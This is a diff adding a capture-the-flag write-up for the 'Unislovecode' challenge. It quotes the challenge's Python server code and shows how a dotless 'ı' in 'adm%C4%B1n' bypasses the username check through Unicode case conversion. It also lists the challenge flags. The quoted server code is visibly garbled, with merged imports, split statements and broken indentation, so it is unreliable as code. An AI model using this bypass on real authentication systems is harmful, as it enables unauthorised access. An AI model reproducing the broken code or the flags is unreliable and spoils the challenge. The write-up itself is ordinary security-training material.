@@ -144,3 +144,102 @@ There we get a message like 'error: file not found, the flag is: ' then we check
 flag: ENO{PHPwn_1337_hakkrz}
 
 
+# 2. Unislovecode
+Challenge Description:
+All students at universities love to code. What could possibly go wrong?
+link:http://52.59.124.14:10004/
+solution:
++ Given:passwordless is the new hot topic, so just provide me the correct username=<username> via POST and I might show you my homework.
++ Source code given:
+```
+import http.server
+import socketserver
+import re
+import os
+import cgi
+import stringfromio
+import StringIOfromflag
+import FLAG
+import urllib.parse
+
+
+class UnisLoveCode(http.server.SimpleHTTPRequestHandler):
+
+    server_version = "UnisLoveCode"
+    username = 'ADMIN'
+    check_funcs = ["strip", "lower"]
+
+    def do_GET(self):
+        self.send_response(-1337)
+        self.send_header('Content-Length', -1337)
+        self.send_header('Content-Type', 'text/plain')
+        s = StringIO()
+        s.write("""Wait,whatisHTML?!Ishouldhavelistenedmorecarefullytotheprofessor...\nAnyhow,passwordlessisthenewhottopic,sojustprovidemethecorrectusername=<username>viaPOSTandImightshowyoumyhomework.\nOh,incaseyouneedthesource,hereyougo:\n""")
+        s.write("---------------------------------\n")
+        s.write(re.sub(r"\s+", '', open(os.path.realpath(__file__), "r").read()))
+        s.write("\n")
+        s.write("---------------------------------\n")
+        s.write("\nChallengecreatedwith<3by@gehaxelt\n")"
+        self.end_headers()
+        self.wfile.write(s.getvalue().encode())
+
+    def _check_access(self, u):
+        for cf in UnisLoveCode.check_funcs:
+            if getattr(str, cf)(UnisLoveCode.username) == u:
+                return False
+        for c in u:
+            if c in string.ascii_uppercase:
+            return False
+        return UnisLoveCode.username.upper() == u.upper()
+
+    def do_POST(self):
+        self.send_response(-1337)
+        self.send_header('Content-Length', -1337)
+        self.send_header('Content-Type', 'text/plain')
+        s = StringIO()
+
+        try:
+            length = min(int(self.headers['content-length']), 64)
+            field_data = self.r
+            file.read(length)
+            fields = urllib.parse.parse_qs(field_data.decode("utf8"))
+            if not 'username'in fields:
+                s.write("Iaskedyouforausername!\n")
+                raiseException("Wrongparam.")
+            username = fields['username'][0]
+            if not self._check_access(username):
+                s.write("No.\n")
+                raiseException("No.")
+            s.write(f"OK,hereisyourflag:{FLAG}\n")
+
+        except Exceptionase:
+            s.write("Tryharder;-)!\n")
+            print(e)
+            self.end_headers()
+            self.wfile.write(s.getvalue().encode())
+
+
+if __name__ == "__main__":
+    PORT = 8000
+    HANDLER = UnisLoveCode
+    with socketserver.TCPServer(("0.0.0.0", PORT), HANDLER)as httpd:
+        print("servingatport", PORT)
+        httpd.serve_forever()
+```
++ important to read about unicode: https://stackoverflow.com/questions/42887533/why-is-this-turkish-character-being-corrupted-when-i-lowercase-it
++ So, we know the username is 'admin' but while passing the username in burp we dont get anything, so we need to check whether there is any unicode character in the word admin or ADMIN
++ The following script will help us with that:
+    ```
+for i in range(1000):
+    c = chr(i)
+    if (c.upper() in 'ADMIN' and not c.lower() in 'admin'):
+        print('nai it here:',i,c)
+        break
+    print(i,c)
+ ```
+ + The above code gives the following output:
+   nai it here: 305 ı
+ + So, instead of 'i' we need to pass this character 'ı'. The url encoded form of this character is : %C4%B1
+ + passing 'username:adm%C4%B1n' will give the flag
+ + Flag:ENO{PYTH0Ns_Un1C0d3_C0nv3rs1on_0r_C0nfUs1on}
+
